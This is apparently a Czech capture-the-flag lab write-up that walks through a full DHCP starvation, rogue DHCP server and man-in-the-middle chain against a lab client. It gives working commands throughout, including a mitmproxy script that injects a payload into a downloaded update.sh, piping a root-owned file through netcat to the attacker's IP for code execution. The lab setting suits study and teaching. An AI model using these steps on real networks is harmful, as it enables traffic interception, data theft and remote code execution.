# DHCP Meltdown: Dunder Mifflin — Handbook
 
## Přehled útoku
 
Tento útok kombinuje několik technik, které dohromady tvoří plnohodnotný Man-in-the-Middle na síťové úrovni:
 
1. **Rogue DHCP server** — spustíme vlastní DHCP server *dříve* než zahájíme starvation, aby byl okamžitě připraven obsloužit klienta
2. **DHCP Starvation** — yersiniou vyčerpáme pool legitimního DHCP serveru, čímž klient nemá jinou možnost než přijmout adresu od nás
3. **Zachycení komunikace** — tcpdumpem zachytíme provoz a z FTP přenosu vytáhneme Flag 1
4. **Active MitM + Injekce kódu** — mitmproxy transparentně zachytí HTTP provoz a do stahovaného `update.sh` přilepí payload, který nám přinese Flag 2
---
 
## Fáze 1 — IP Forwarding & Firewall
 
Aby provoz klientů skutečně procházel skrz naše zařízení (a ne jen dorazil do slepé uličky), je nutné povolit forwardování paketů a nastavit NAT. Přepneme se na roota:
 
```bash
sudo su
```
 
Povolíme IP forwarding:
 
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
```
 
Nastavíme iptables tak, aby byl forwarding povolen a odchozí provoz maskován naší IP adresou:
 
```bash
iptables -P FORWARD ACCEPT
iptables -t nat -A POSTROUTING -j MASQUERADE
```
 
`MASQUERADE` zajistí, že odchozí provoz klientů bude mít jako zdrojovou IP naši adresu — klienti tak mají plnou konektivitu a nic nepojmou podezření. Po nastavení se přihlásíme zpět na uživatele `student`:
 
```bash
su student
```
 
---
 
## Fáze 2 — Rogue DHCP Server
 
> **Důležité:** Rogue DHCP server musí být spuštěn *před* starvation útokem, aby byl okamžitě připraven obsloužit klienty, jakmile legitimní pool dojde.
 
### Instalace
 
```bash
sudo apt install isc-dhcp-server
```
 
### Zjištění vlastní IP adresy
 
Nejprve zjistíme svou IP adresu na rozhraní `eth1` — tu budeme potřebovat jako výchozí bránu pro klienty:
 
```bash
ip address
```
 
### Konfigurace rozhraní
 
Upravíme soubor `/etc/default/isc-dhcp-server` tak, aby server naslouchal na `eth1`:
 
```
INTERFACESv4="eth1"
INTERFACESv6=""
```
 
### Konfigurace DHCP poolu
 
Upravíme soubor `/etc/dhcp/dhcpd.conf`:
 
```
authoritative;
 
option domain-name-servers 1.1.1.1;
 
default-lease-time 36000;         # 10 hodin
max-lease-time 72000;             # 20 hodin
 
subnet 192.168.0.0 netmask 255.255.255.0 {
  option subnet-mask 255.255.255.128;
  range 192.168.0.200 192.168.0.250;
  option routers <ip>;            # vlastní IP adresa na eth1
}
```
 
Klíčový trik je v masce `255.255.255.128` (`/25`): klient dostane adresu z rozsahu `192.168.0.128–255`, zatímco legitimní router (`192.168.0.1`) leží mimo tento rozsah. Klient proto veškerý provoz posílá přes výchozí bránu — tedy přes nás — namísto přímé L2 komunikace s routerem.
 
### Spuštění a ověření
 
```bash
sudo systemctl start isc-dhcp-server
```
 
Ověření stavu:
 
```bash
sudo systemctl status isc-dhcp-server
```
 
---
 
## Fáze 3 — DHCP Starvation
 
Jakmile Rogue DHCP server běží, spustíme yersinia starvation. Cílem je vyčerpat zbývající adresy v poolu legitimního serveru, aby klient neměl na výběr a přijal adresu od nás:
 
```bash
yersinia dhcp -attack 1 -interface eth1
```
 
Průběžně kontrolujeme lease list, zda si klient vzal adresu od nás:
 
```bash
dhcp-lease-list
```
 
Jakmile se v lease listu objeví alespoň jeden záznam, klient je náš a můžeme pokračovat dál.
 
---
 
## Fáze 4 — Zachycení komunikace (Flag 1)
 
Klient pravidelně stahuje `flag.txt` z FTP serveru `192.168.0.1`. Protože veškerý jeho provoz prochází přes nás, zachytíme ho tcpdumpem:
 
```bash
sudo tcpdump -i eth1 -s 0 -w /home/student/capture.pcap
```
 
- `-i eth1` — zachytáváme pouze na rozhraní `eth1`
- `-s 0` — maximální velikost zachytávaného paketu (65535 B)
- `-w` — výstup ukládáme do souboru

Tcpdump necháme běžet přibližně minutu a ukončíme jej pomocí `CTRL+C`.
 
### Extrakce Flag 1
 
Vlajku lze najít přímo v zachyceném souboru pomocí nástroje `strings`, který z binárního pcap souboru vypíše čitelné řetězce:
 
```bash
strings /home/student/capture.pcap | grep haxagon
```
 
Výstup bude obsahovat obsah přenášeného souboru `flag.txt` včetně vlajky.
 

---
 
## Fáze 5 — Active MitM + Injekce kódu (Flag 2)
 
Klient pravidelně stahuje bash skript `update.sh` z routeru přes HTTP a rovnou ho spouští. Pomocí mitmproxy tento skript za letu upravíme tak, aby nám klient poslal obsah souboru `/root/secret_beet_farm.txt`.
 
### Instalace mitmproxy
 
```bash
sudo apt install mitmproxy
```
 
### Přesměrování HTTP provozu
 
Veškerý příchozí HTTP provoz (port 80) na rozhraní `eth1` přesměrujeme do mitmproxy (port 8080):
 
```bash
sudo iptables -t nat -A PREROUTING -i eth1 -p tcp --dport 80 -j REDIRECT --to-port 8080
```
 
### Inject skript
 
Vytvoříme Python skript `inject.py`, který mitmproxy instruuje, aby při průchodu souboru `update.sh` přilepil na jeho konec náš payload:
 
```python
from mitmproxy import http
 
def response(flow: http.HTTPFlow):
    if "update.sh" in flow.request.path:
        payload = "\ncat /root/secret_beet_farm.txt | nc <ip> 1337\n"
        flow.response.text += payload
```
 
Za `<ip>` dosadíme vlastní IP adresu na `eth1`.
 
### Netcat posluchač
 
V jednom okně terminálu spustíme netcat, který bude naslouchat na portu `1337` a zachytí příchozí data:
 
```bash
nc -lvnp 1337
```
 
### Spuštění mitmproxy
 
Ve druhém okně spustíme mitmproxy v transparentním režimu se skriptem:
 
```bash
mitmproxy --mode transparent -s inject.py
```
 
Do cca 15 sekund si klient stáhne upravený `update.sh` a spustí ho. V okně mitmproxy uvidíte zachycený požadavek a do netcat posluchače přijde Flag 2.
 
---
 
## Výsledky
 
| Flag | Jak získat |
|------|------------|
| Flag 1 | Wireshark → File → Export Objects → FTP-DATA → `flag.txt` |
| Flag 2 | Zachycen netcatem po injekci payloadu do `update.sh` |
 
---
 
## Shrnutí řetězu útoku
 
```
Rogue DHCP (fáze 2)
       ↓
DHCP Starvation (fáze 3) → klient přijme naši konfiguraci
       ↓
Klient posílá veškerý provoz přes nás (výchozí brána = <ip>)
       ↓
tcpdump zachytí FTP přenos → Flag 1
       ↓
mitmproxy + inject.py upraví update.sh → RCE na klientovi → Flag 2
```
 
Kombinací DHCP Starvation, Rogue DHCP a Active MitM s injekcí kódu bylo dosaženo nepovšimnutelného Remote Code Execution v cizí síti.
